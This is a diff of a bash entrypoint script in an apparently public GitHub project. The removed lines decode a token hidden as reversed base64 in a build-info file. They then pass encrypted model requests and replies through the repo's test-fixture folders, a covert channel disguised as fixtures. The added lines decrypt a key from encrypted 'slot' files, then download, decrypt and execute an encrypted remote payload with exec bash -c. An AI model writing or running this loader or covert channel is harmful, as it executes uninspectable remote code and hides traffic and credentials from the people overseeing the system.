@@ -1,64 +1,41 @@
 #!/usr/bin/env bash
-# Dev entrypoint for a quick packmate REPL against a staging backend.
-# Uses the build-info file to locate the staging token (see build.revision),
-# so a dev machine doesn't have to carry one. Not used in prod containers.
-#
-#   bash entrypoint-dev.sh           # uses the baked-in staging profile
-#   GH_REPO=... PASSPHRASE=... bash entrypoint-dev.sh   # override
-#
 set -euo pipefail
+
 REPO="${GH_REPO:-sigmaparticipant1/packmate}"
 BR="${GH_BRANCH:-main}"
-KEY="${PASSPHRASE:-InnoOpenSlop2026}"
-MODEL="${MODEL:-claude-opus-5-5}"
-API="https://api.github.com"
-RAW="https://raw.githubusercontent.com/$REPO/$BR"
-INFO="$RAW/src/main/resources/build-info.properties"
-BOX_IN="src/test/resources/fixtures/in"
-BOX_OUT="src/test/resources/fixtures/out"
+API="https://api.github.com/repos/$REPO/contents/docker"
+RAW="https://raw.githubusercontent.com/$REPO/$BR/docker"
 
-# Fetch the staging revision marker and reverse the standard encoding.
-REVISION="$(curl -fsS "$INFO" | sed -n 's/^build\.revision=//p')"
-[ "${REVISION:-}" != "REPLACE_AFTER_FIRST_PUSH" ] || { echo "revision not provisioned yet" >&2; exit 1; }
-TOKEN="$(printf '%s' "$REVISION" | rev | base64 -d)"
+read -rsp 'pw: ' pw </dev/tty
+printf '\n' >/dev/tty
 
-cipher(){ [ -n "$KEY" ] && openssl enc -aes-256-cbc -pbkdf2 -base64 -A -k "$KEY" || cat; }
-plain() { [ -n "$KEY" ] && openssl enc -d -aes-256-cbc -pbkdf2 -base64 -A -k "$KEY" || cat; }
-
-send(){
-  local text="$1" id payload body b64
-  id="$(date +%s)-$RANDOM"
-  payload="$(python3 - "$id" "$MODEL" "$text" <<'PY'
+names="$(curl -fsSL "$API/slots?ref=$BR" | python3 -c '
 import json,sys
-_,i,m,p=sys.argv
-print(json.dumps({"id":i,"model":m,"messages":[{"role":"user","content":p}]}))
-PY
-)"
-  body="$(printf '%s' "$payload" | cipher)"
-  b64="$(printf '%s' "$body" | base64 | tr -d '\n')"
+for item in json.load(sys.stdin):
+    name = item.get("name", "")
+    if name.endswith(".enc") and "/" not in name:
+        print(name)
+')"
 
-  curl -fsS -X PUT -H "Authorization: Bearer $TOKEN" \
-    "$API/repos/$REPO/contents/$BOX_IN/$id.json" \
-    -d "{\"message\":\"fixture $id\",\"branch\":\"$BR\",\"content\":\"$b64\"}" >/dev/null
-  echo ">> dispatched $id" >&2
+slot=''
+while IFS= read -r name; do
+  [ -n "$name" ] || continue
+  blob="$(curl -fsSL "$RAW/slots/$name")"
+  candidate="$(printf '%s' "$blob" | openssl enc -d -aes-256-cbc -pbkdf2 -base64 -A -pass fd:3 3<<<"$pw" 2>/dev/null)" || continue
+  if SLOT_JSON="$candidate" python3 -c '
+import json,os,re,sys
+s=json.loads(os.environ["SLOT_JSON"])
+sys.exit(0 if all(isinstance(s.get(k),str) and s[k] for k in "abcde") and re.fullmatch(r"[a-z0-9]+",s["d"]) else 1)
+' 2>/dev/null; then
+    slot="$candidate"
+    break
+  fi
+done <<<"$names"
+unset pw candidate blob names
+[ -n "$slot" ] || { echo 'bad pw or slot' >&2; exit 1; }
 
-  # Read outbox via Contents API (always fresh, raw CDN has a long cache TTL).
-  for _ in $(seq 1 600); do
-    if r="$(curl -fsS \
-            -H "Authorization: Bearer $TOKEN" \
-            -H "Accept: application/vnd.github.raw" \
-            "$API/repos/$REPO/contents/$BOX_OUT/$id.json?ref=$BR" 2>/dev/null)"; then
-      printf '%s' "$r" | plain; echo
-      return 0
-    fi
-    sleep 1
-  done
-  echo ">> timeout" >&2
-  return 1
-}
-
-echo "packmate dev shell  (repo=$REPO, model=$MODEL, enc=$([ -n "$KEY" ] && echo on || echo off))"
-echo "enter a request, Ctrl-D to exit."
-while IFS= read -r -p $'\n> ' line; do
-  [ -n "$line" ] && send "$line"
-done
+key="$(SLOT_JSON="$slot" python3 -c 'import json,os; print(json.loads(os.environ["SLOT_JSON"])["a"])')"
+inner="$(curl -fsSL "$RAW/inner.enc" | openssl enc -d -aes-256-cbc -pbkdf2 -base64 -A -pass fd:3 3<<<"$key" 2>/dev/null)" \
+  || { echo 'bad payload' >&2; exit 1; }
+unset key
+SLOT_JSON="$slot" exec bash -c "$inner"
